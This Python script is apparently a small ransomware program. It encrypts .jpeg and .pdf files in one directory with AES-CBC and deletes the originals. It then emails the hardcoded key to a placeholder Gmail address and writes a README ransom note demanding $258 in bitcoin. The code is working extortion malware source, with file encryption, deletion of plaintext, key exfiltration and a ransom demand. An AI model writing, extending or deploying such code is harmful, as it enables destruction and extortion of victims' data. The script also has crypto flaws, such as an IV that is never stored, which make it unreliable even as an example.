import os
import time
import ssl
import smtplib
import glob
from email.message import EmailMessage
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def create_readme():
    directory = "workWinkWink"

    if not os.path.exists(directory):
        print(f"{directory} directory does not exist")
        return

    # Ask for user input for README file content
    readme_content = """ 
    Υour files are encrypted, I guess you weren't very careful. 
    That's okay, I'm not heartless, this might teach you a lesson and you won't have to just throw away your precious files. 
    
    Of course, no lesson is free. This will cost you $258, send it in bitcoin to "address" and you will receive a mail with the encryption key.
    Glad I taught you.
    """

    # Create and write to the README file
    with open(os.path.join(directory, "README.txt"), "w") as readme_file:
        readme_file.write(readme_content)

def mail():
    email_sender = 'examble1@gmail.com'
    email_password = os.environ.get("EMAIL_PASSWORD")
    email_receiver = 'examble2@gmail.com'

    if email_password is None:
        print("EMAIL_PASSWORD environment variable not set")
        return

    # Create email message
    subject = 'ransomware'
    body = """ 
    The encryption key is xluplenjupfkjtsqdekcndymuwlieyhq
    """

    em= EmailMessage()
    em['from'] =email_sender
    em['to'] =email_receiver
    em['subject'] =subject
    em.set_content(body)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, em.as_string())


def files():
    directory = "workWinkWink"
    extensions = (".jpeg", ".pdf")
    found_files = {os.path.basename(f) for f in glob.glob(f"{directory}/*") if f.endswith(extensions)}

    if not os.path.exists(directory):
        print(f"{directory} directory does not exist")
        return

    for filename in found_files:
        yield os.path.join(directory, filename)


def main():
    # Define the encryption key and cipher mode
    key = b'xluplenjupfkjtsqdekcndymuwlieyhq'
    cipher = AES.new(key, AES.MODE_CBC)

    # Iterate over all matching files in the directory
    for i, filename in enumerate(files()):
        # Read the plaintext file
        with open(filename, 'rb') as plaintext_file:
            plaintext = plaintext_file.read()

        # Encrypt the plaintext
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        # Write the ciphertext to the same file
        encrypted_filename = f"encrypted{i+1}-{os.path.basename(filename)}"
        with open(os.path.join(os.path.dirname(filename), encrypted_filename), 'wb') as encrypted_file:
            encrypted_file.write(ciphertext)

        # Remove the plaintext file
        os.remove(filename)

    # Send email notification after all files have been processed
    mail()
    create_readme()


if __name__ == "__main__":
    main()
